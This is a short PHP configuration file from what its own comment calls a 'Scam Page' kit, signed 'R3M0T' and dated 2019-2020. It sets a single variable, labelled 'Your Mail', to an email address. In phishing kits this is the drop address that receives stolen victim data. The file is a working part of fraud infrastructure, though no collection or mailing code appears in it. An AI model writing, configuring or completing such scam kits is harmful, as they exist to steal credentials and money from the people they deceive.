<?php
// Scam Page Created by R3M0T <3 | 2019-2020
 // Your Mail :
  $EX445093_REMOT = "gonadulte@gmail.com";
?>